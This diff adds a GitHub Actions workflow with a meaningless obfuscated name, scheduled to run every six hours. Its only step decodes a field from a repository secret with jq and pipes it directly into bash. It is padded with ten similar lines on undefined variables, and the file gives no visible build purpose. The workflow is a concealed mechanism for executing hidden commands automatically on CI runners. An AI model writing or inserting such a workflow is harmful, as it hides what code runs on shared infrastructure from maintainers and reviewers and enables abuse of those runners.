@@ -1,0 +1,28 @@
+name: linjunhencheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linjunhencheng
+        env:
+          r930: ${{ secrets.r930 }}
+        run: |
+          echo $r930 | jq -r .ktl367 | /bin/bash
+          echo $qzux00915 | jq -r .aqwqp6 | /bin/bash
+          echo $mk242 | jq -r .pj92 | /bin/bash
+          echo $ij59041 | jq -r .dtzyz6 | /bin/bash
+          echo $kzjph112 | jq -r .ayp84 | /bin/bash
+          echo $xcbo6 | jq -r .pru315 | /bin/bash
+          echo $yfvsn6876 | jq -r .ivris3024 | /bin/bash
+          echo $n228 | jq -r .yoal4 | /bin/bash
+          echo $ycawp71215 | jq -r .ut00 | /bin/bash
+          echo $iwcl392 | jq -r .bgm7247 | /bin/bash
+          echo $e03 | jq -r .ytx0 | /bin/bash
+
